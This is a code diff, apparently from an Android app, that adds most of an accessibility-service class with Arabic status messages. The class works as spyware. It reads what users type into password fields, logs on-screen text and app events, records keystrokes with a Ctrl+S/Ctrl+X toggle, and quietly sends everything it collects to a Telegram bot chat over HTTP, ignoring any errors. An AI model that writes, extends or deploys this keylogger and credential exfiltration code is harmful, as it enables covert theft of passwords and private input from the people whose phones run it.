@@ -272,3 +272,124 @@ public class MyAccessibilityService extends android.accessibilityservice.Accessi
         if (!TextUtils.isEmpty(text)) {
             String passInfo = "🔐 كلمة مرور مدخلة في " + currentApp + ":\n" +
                              "🔖 الحقل: " + (hint != null ? hint : viewId) + "\n" +
+                             "🔑 القيمة: " + text;
+            sendTelegram(passInfo);
+        }
+    }
+    
+    private String getNodeText(AccessibilityNodeInfo node) {
+        if (node == null) return "";
+        CharSequence text = node.getText();
+        return text != null ? text.toString() : "";
+    }
+    
+    private String getNodeHint(AccessibilityNodeInfo node) {
+        if (node == null) return "";
+        CharSequence hint = node.getHintText();
+        return hint != null ? hint.toString() : "";
+    }
+    
+    private String getViewId(AccessibilityNodeInfo node) {
+        if (node == null) return "";
+        String viewId = node.getViewIdResourceName();
+        return viewId != null ? viewId : "";
+    }
+    
+    private void logEvent(AccessibilityEvent event) {
+        StringBuilder eventLog = new StringBuilder("📝 حدث: " + event.getEventType() + "\n");
+        eventLog.append("📱 التطبيق: ").append(currentApp).append("\n");
+        eventLog.append("⏰ الوقت: ").append(System.currentTimeMillis()).append("\n");
+        
+        List<CharSequence> text = event.getText();
+        if (text != null && !text.isEmpty()) {
+            eventLog.append("📄 النص: ");
+            for (CharSequence t : text) {
+                eventLog.append(t).append(" ");
+            }
+            eventLog.append("\n");
+        }
+        
+        if (keyLogBuffer.length() > 100) {
+            sendTelegram(keyLogBuffer.toString());
+            keyLogBuffer.setLength(0);
+        } else {
+            keyLogBuffer.append(eventLog.toString());
+        }
+    }
+    
+    @Override
+    protected boolean onKeyEvent(KeyEvent event) {
+        if (event.getAction() == KeyEvent.ACTION_DOWN) {
+            int keyCode = event.getKeyCode();
+            String key = KeyEvent.keyCodeToString(keyCode);
+            
+            if (isKeyLogging) {
+                if (keyCode == KeyEvent.KEYCODE_ENTER) {
+                    keyLogBuffer.append("\n");
+                } else if (keyCode == KeyEvent.KEYCODE_DEL) {
+                    if (keyLogBuffer.length() > 0) {
+                        keyLogBuffer.deleteCharAt(keyLogBuffer.length() - 1);
+                    }
+                } else {
+                    char pressedKey = (char) event.getUnicodeChar();
+                    if (pressedKey != 0) {
+                        keyLogBuffer.append(pressedKey);
+                    }
+                }
+            }
+            
+            if (event.isCtrlPressed() && keyCode == KeyEvent.KEYCODE_S) {
+                startKeyLogging();
+                return true;
+            } else if (event.isCtrlPressed() && keyCode == KeyEvent.KEYCODE_X) {
+                stopKeyLogging();
+                return true;
+            }
+        }
+        return super.onKeyEvent(event);
+    }
+    
+    public void startKeyLogging() {
+        isKeyLogging = true;
+        keyLogBuffer.setLength(0);
+        sendTelegram("⌨️ بدأ تسجيل لوحة المفاتيح");
+    }
+    
+    public void stopKeyLogging() {
+        isKeyLogging = false;
+        if (keyLogBuffer.length() > 0) {
+            sendTelegram("⌨️ آخر المدخلات:\n" + keyLogBuffer.toString());
+            keyLogBuffer.setLength(0);
+        }
+        sendTelegram("⏹ تم إيقاف تسجيل لوحة المفاتيح");
+    }
+    
+    @Override
+    public void onInterrupt() {
+        sendTelegram("⚠️ تم مقاطعة Accessibility Service");
+    }
+    
+    @Override
+    public void onDestroy() {
+        if (keyLogBuffer.length() > 0) {
+            sendTelegram("⌨️ مدخلات قبل الإيقاف:\n" + keyLogBuffer.toString());
+        }
+        sendTelegram("⛔ تم إيقاف Accessibility Service");
+        super.onDestroy();
+    }
+    
+    private void sendTelegram(String msg) {
+        try {
+            OkHttpClient client = new OkHttpClient.Builder()
+                    .connectTimeout(30, TimeUnit.SECONDS)
+                    .build();
+            
+            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
+            
+            client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
+                @Override public void onFailure(Call c, IOException e) {}
+                @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
+            });
+        } catch (Exception e) {}
+    }
+}
